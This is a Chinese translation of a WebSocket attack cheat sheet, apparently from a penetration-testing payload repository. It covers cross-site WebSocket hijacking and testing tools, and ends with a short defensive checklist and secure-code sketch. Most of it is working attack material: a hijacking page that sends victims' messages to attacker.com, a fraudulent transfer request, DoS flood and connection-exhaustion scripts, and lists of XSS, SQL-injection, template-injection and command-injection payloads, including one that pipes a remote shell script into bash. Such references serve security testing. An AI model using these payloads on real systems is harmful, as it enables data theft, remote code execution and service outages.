<a id="-websocket-attacks-cheatsheet"></a>
# 🔌 WebSocket 攻击速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./WebSocket-Attacks.tr.md) • [🇬🇷 Ελληνικά](./WebSocket-Attacks.el.md)

```
██╗    ██╗███████╗██████╗ ███████╗ ██████╗  ██████╗██╗  ██╗███████╗████████╗
██║    ██║██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
██║ █╗ ██║█████╗  ██████╔╝███████╗██║   ██║██║     █████╔╝ █████╗     ██║   
██║███╗██║██╔══╝  ██╔══██╗╚════██║██║   ██║██║     ██╔═██╗ ██╔══╝     ██║   
╚███╔███╔╝███████╗██████╔╝███████║╚██████╔╝╚██████╗██║  ██╗███████╗   ██║   
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗                   
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝                   
███████║   ██║      ██║   ███████║██║     █████╔╝ ███████╗                   
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║                   
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║                   
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝                   
```

---

<a id="-websocket-basics"></a>
## 🔍 WebSocket 基础

<a id="handshake-request"></a>
### 握手请求
```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

<a id="handshake-response"></a>
### 握手响应
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

<a id="detection"></a>
### 检测
```
- ws://（未加密）
- wss://（TLS 加密）
- Upgrade: websocket 请求头
- Network（网络）面板显示 "101 Switching Protocols"
```

---

<a id="-websocket-vulnerabilities"></a>
## 🎯 WebSocket 漏洞

<a id="1-cross-site-websocket-hijacking-cswsh"></a>
### 1. 跨站 WebSocket 劫持 (CSWSH)

**存在漏洞的条件:** 服务器未校验 Origin 请求头

```html
<!-- 攻击者的页面 -->
<script>
  var ws = new WebSocket('wss://target.com/chat');
  
  ws.onopen = function() {
    // 连接建立后，攻击者即可发送消息
    ws.send('{"action": "get_messages"}');
  };
  
  ws.onmessage = function(event) {
    // 窃取数据并发送给攻击者
    fetch('https://attacker.com/steal?data=' + btoa(event.data));
  };
</script>
```

**类似 CSRF 的攻击:**
```html
<script>
  var ws = new WebSocket('wss://target.com/api');
  ws.onopen = function() {
    // 以受害者身份执行操作
    ws.send('{"action": "transfer", "to": "attacker", "amount": 1000}');
  };
</script>
```

---

<a id="2-missing-origin-validation"></a>
### 2. 缺少 Origin 校验

**测试:**
```bash
# 使用 wscat
wscat -c wss://target.com/ws -H "Origin: https://evil.com"

# 使用 websocat
websocat -H "Origin: https://evil.com" wss://target.com/ws
```

**漏洞利用:**
```javascript
// 服务器接受任意来源的情况
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send('{"action": "sensitive_operation"}');
```

---

<a id="3-authentication-bypass"></a>
### 3. 身份验证绕过

**WebSocket 连接未进行身份验证:**
```javascript
// 不显式提供 Cookie／令牌建立连接（浏览器行为见译注）
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send('{"action": "list_users"}');  // 无需身份验证？
};
```

**URL 中的令牌（泄露风险）:**
```
wss://target.com/ws?token=SECRET_TOKEN
// 令牌可能泄露到日志或来源信息中（具体情况见译注）
```

**测试不同身份验证状态:**
```javascript
// 测试已过期的令牌
// 测试修改后的令牌
// 测试不提供令牌
// 测试另一个用户的令牌
```

---

<a id="4-injection-attacks-via-websocket"></a>
### 4. 通过 WebSocket 进行注入攻击

**通过 WebSocket 触发 XSS:**
```javascript
// 发送 XSS 载荷
ws.send('{"message": "<script>alert(document.cookie)</script>"}');
ws.send('{"message": "<img src=x onerror=alert(1)>"}');
```

**SQL 注入:**
```javascript
ws.send('{"query": "\' OR 1=1--"}');
ws.send('{"id": "1 UNION SELECT username,password FROM users--"}');
```

**命令注入:**
```javascript
ws.send('{"cmd": "ping 127.0.0.1; id"}');
ws.send('{"file": "test.txt; cat /etc/passwd"}');
```

**NoSQL 注入:**
```javascript
ws.send('{"username": {"$ne": ""}, "password": {"$ne": ""}}');
```

---

<a id="5-dos-attacks"></a>
### 5. 拒绝服务（DoS）攻击

**消息洪泛:**
```javascript
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  setInterval(() => {
    ws.send('x'.repeat(10000));  // 大消息
  }, 1);
};
```

**连接耗尽:**
```python
import websocket
import threading

def connect():
    ws = websocket.WebSocket()
    ws.connect("wss://target.com/ws")
    while True:
        pass  # 保持连接打开

for i in range(1000):
    threading.Thread(target=connect).start()
```

---

<a id="6-data-manipulation"></a>
### 6. 数据篡改

**消息篡改:**
```javascript
// 拦截并修改消息
// 使用 Burp Suite 的 WebSocket 拦截功能

// 原始消息
{"action": "transfer", "amount": 10, "to": "user123"}

// 修改后的消息
{"action": "transfer", "amount": 10000, "to": "attacker"}
```

**竞态条件:**
```javascript
// 快速连续发送多个请求
for(let i = 0; i < 100; i++) {
  ws.send('{"action": "claim_bonus"}');
}
```

---

<a id="-testing-tools"></a>
## 🛠️ 测试工具

<a id="burp-suite"></a>
### Burp Suite
```
1. Proxy（代理）→ WebSockets history（WebSocket 历史）
2. 右键 → Send to Repeater（发送至 Repeater）
3. 修改并重新发送消息
4. 勾选 "Auto-scroll to end"（自动滚动到底部）
```

<a id="wscat-cli"></a>
### wscat (CLI)
```bash
# 安装
npm install -g wscat

# 连接
wscat -c wss://target.com/ws

# 携带请求头
wscat -c wss://target.com/ws -H "Cookie: session=abc123"
wscat -c wss://target.com/ws -H "Authorization: Bearer TOKEN"

# 指定来源
wscat -c wss://target.com/ws -o "https://target.com"
```

<a id="websocat"></a>
### websocat
```bash
# 安装
cargo install websocat

# 连接
websocat wss://target.com/ws

# 携带请求头
websocat -H "Origin: https://evil.com" wss://target.com/ws
websocat -H "Cookie: session=abc" wss://target.com/ws
```

<a id="python-testing-script"></a>
### Python 测试脚本
```python
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    # 测试载荷
    ws.send('{"action": "test"}')
    ws.send('{"action": "get_users", "id": "1 OR 1=1"}')

ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    header={"Origin": "https://evil.com"},
    cookie="session=abc123",
    on_message=on_message,
    on_open=on_open
)
ws.run_forever()
```

<a id="browser-devtools"></a>
### 浏览器开发者工具
```javascript
// 监控 WebSocket 流量
// F12 → Network（网络）→ WS 筛选

// 手动测试
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.onopen = () => ws.send('test');
```

---

<a id="-payload-collection"></a>
## 💉 载荷合集

<a id="authentication-testing"></a>
### 身份验证测试
```json
// 不提供身份凭据
{"action": "get_secret_data"}

// 空令牌
{"token": "", "action": "admin_action"}

// 值为 null 的令牌
{"token": null, "action": "delete_user"}
```

<a id="xss-payloads"></a>
### XSS 载荷
```json
{"message": "<script>alert('XSS')</script>"}
{"message": "<img src=x onerror=alert(1)>"}
{"name": "<svg onload=alert(1)>"}
{"data": "'-alert(1)-'"}
```

<a id="sqli-payloads"></a>
### SQL 注入载荷
```json
{"id": "1' OR '1'='1"}
{"user": "admin'--"}
{"search": "1 UNION SELECT password FROM users--"}
{"filter": "1; DROP TABLE users--"}
```

<a id="command-injection"></a>
### 命令注入
```json
{"host": "localhost; id"}
{"file": "test.txt | cat /etc/passwd"}
{"cmd": "`whoami`"}
{"input": "$(curl attacker.com/shell.sh | bash)"}
```

<a id="path-traversal"></a>
### 路径遍历
```json
{"file": "../../../etc/passwd"}
{"path": "....//....//etc/passwd"}
{"template": "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}"}
```

---

<a id="-testing-checklist"></a>
## 📋 测试清单

```markdown
## WebSocket 安全测试清单

□ 识别 WebSocket 端点
□ 检查 Origin 请求头校验
□ 测试 CSWSH（跨站 WebSocket 劫持）
□ 测试身份验证要求
□ 检查令牌是否安全传递
□ 测试注入漏洞（XSS、SQLi 等）
□ 测试授权检查（访问其他用户的数据）
□ 检查速率限制
□ 测试消息大小限制
□ 查找敏感数据泄露
□ 测试连接处理（重新连接）
□ 检查加密（wss:// 与 ws://）
```

---

<a id="-secure-implementation"></a>
## 🔐 安全实现示例

```javascript
// 服务端 Origin 校验
if (request.headers.origin !== 'https://trusted-site.com') {
  socket.close(1008, 'Invalid origin');
  return;
}

// 基于令牌的身份验证
socket.on('connection', function(ws, req) {
  const token = req.url.split('token=')[1];
  if (!validateToken(token)) {
    ws.close(1008, 'Invalid token');
  }
});

// 输入校验
socket.on('message', function(data) {
  const parsed = JSON.parse(data);
  if (!isValidInput(parsed)) {
    socket.send(JSON.stringify({error: 'Invalid input'}));
    return;
  }
});
```

---

<a id="-related-payloads"></a>
## 🔗 相关载荷

- [XSS 载荷](./XSS.zh-CN.md)
- [SQL 注入载荷](./SQLi.zh-CN.md)
- [命令注入](./Command-Injection.zh-CN.md)

---

**返回载荷目录：** 原文所指的载荷索引不可用（`./README.md`）；本目录没有英文 README，故未创建翻译索引。

> 译注：[RFC 6455 第 10 节](https://www.rfc-editor.org/rfc/rfc6455#section-10)区分浏览器来源校验与非浏览器客户端；Origin 不是身份凭据，也不能替代逐操作授权。浏览器建立连接时可能自动携带符合条件的 Cookie，代码未显式传入令牌不表示匿名连接。查询参数中的令牌可能被服务日志记录，但 WebSocket URL 不会因此自动成为页面 Referer。末尾安全实现仅为概念片段，依赖正确的服务端 API 与异常处理。
